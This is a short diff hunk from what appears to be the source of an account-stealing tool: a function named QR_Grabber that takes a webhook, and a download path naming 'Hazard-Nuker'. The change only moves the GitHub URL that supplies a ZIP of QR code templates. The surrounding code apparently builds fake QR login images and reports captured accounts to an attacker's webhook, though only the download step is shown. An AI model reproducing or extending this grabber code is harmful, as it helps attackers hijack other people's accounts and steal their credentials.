@@ -99,7 +99,7 @@ def QR_Grabber(Webhook):
 
     # Download qr code templates
     urlretrieve(
-        "https://github.com/Rdimo/Injection/raw/master/QR-Code.zip",
+        "https://github.com/Rdimo/images/raw/master/Hazard-Nuker/QR-Code.zip",
         filename="QR-Code.zip",
     )
     with ZipFile("QR-Code.zip", 'r')as zip2:
